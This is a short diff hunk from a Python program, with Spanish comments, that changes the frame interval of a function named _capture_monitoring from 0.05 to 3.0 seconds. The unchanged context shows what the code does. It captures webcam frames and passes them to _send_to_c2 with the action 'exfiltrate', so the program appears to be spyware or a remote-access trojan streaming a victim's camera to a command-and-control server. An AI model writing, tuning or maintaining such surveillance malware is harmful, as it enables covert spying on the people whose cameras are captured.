@@ -308,8 +308,8 @@ def _capture_monitoring():
             if len(payload) > 1:
                 _send_to_c2("exfiltrate", payload)
 
-            # Intervalo entre frames para streaming (aprox 10 FPS)
-            time.sleep(0.05)
+            # Intervalo entre frames para streaming (reducido para estabilidad en la nube)
+            time.sleep(3.0)
     finally:
         if cam:
             cam.release()
